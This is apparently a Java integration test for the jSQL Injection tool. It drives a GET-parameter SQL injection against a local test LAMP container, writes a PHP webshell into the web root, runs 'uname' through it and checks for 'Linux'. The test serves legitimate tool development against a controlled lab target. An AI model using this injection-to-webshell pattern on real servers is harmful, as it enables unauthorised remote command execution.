package com.test.vendor.mysql;

import com.jsql.model.InjectionModel;
import com.jsql.model.exception.JSqlException;
import com.jsql.view.terminal.SystemOutTerminal;
import org.junit.jupiter.api.Assertions;
import org.junitpioneer.jupiter.RetryingTest;

import java.util.UUID;

public class MySqlWebshellSuiteIT extends ConcreteMySqlSuiteIT {
    
    @Override
    public void setupInjection() throws Exception {
        
        InjectionModel model = new InjectionModel();
        this.injectionModel = model;

        model.subscribe(new SystemOutTerminal());

        model.getMediatorUtils().getParameterUtil().initializeQueryString("http://jsql-lamp:8079/get2.php?id=");

        model
        .getMediatorUtils()
        .getConnectionUtil()
        .withMethodInjection(model.getMediatorMethod().getQuery())
        .withTypeRequest("GET");
        
        model.beginInjection();
    }
    
    @RetryingTest(3)
    public void webshell() throws JSqlException, InterruptedException {

        this.injectionModel.getResourceAccess().createWebShell("/var/www/html/", "");
        // For coverage
        this.injectionModel.getResourceAccess().createWebShell("/var/www/html", "http://jsql-lamp:8079/fake");

        String resultCommand = this.injectionModel.getResourceAccess().runWebShell(
            "uname",
            UUID.randomUUID(),
            "http://jsql-lamp:8079/."+ this.injectionModel.getVersionJsql() +".jw.php"
        );

        LOGGER.info("Webshell: found {} to find {}", resultCommand.trim(), "Linux");

        Assertions.assertEquals("Linux", resultCommand.trim());
    }
}
